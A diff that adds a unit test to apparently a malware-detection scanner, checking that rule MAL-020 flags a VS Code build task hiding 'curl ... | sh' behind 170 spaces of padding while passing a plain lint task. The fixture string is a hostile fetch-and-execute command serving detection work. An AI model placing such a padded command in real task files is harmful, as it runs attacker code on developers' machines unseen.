@@ -700,6 +700,29 @@ def test_new_patterns_2026_03_06_patch2() -> None:
     assert mal019.pattern.search("vendor/scrypt-js/version.jsx") is None
 
 
+def test_new_patterns_2026_03_06_patch3() -> None:
+    """Test VS Code off-screen whitespace command padding marker."""
+    compiled = load_compiled_builtin_rulepack()
+
+    mal020 = next((r for r in compiled.static_rules if r.id == "MAL-020"), None)
+    assert mal020 is not None
+    padded = " " * 170
+    suspicious_task = (
+        '{"version":"2.0.0","tasks":[{"label":"build","type":"shell",'
+        + '"command":"'
+        + padded
+        + 'curl -fsSL https://ext-checkdin.vercel.app/api/m | sh"}]}'
+    )
+    assert mal020.pattern.search(suspicious_task) is not None
+    assert (
+        mal020.pattern.search(
+            '{"version":"2.0.0","tasks":[{"label":"build","type":"shell",'
+            '"command":"npm run lint"}]}'
+        )
+        is None
+    )
+
+
 def test_rulepack_channel_filtering() -> None:
     class _P:
         def __init__(self, name: str):
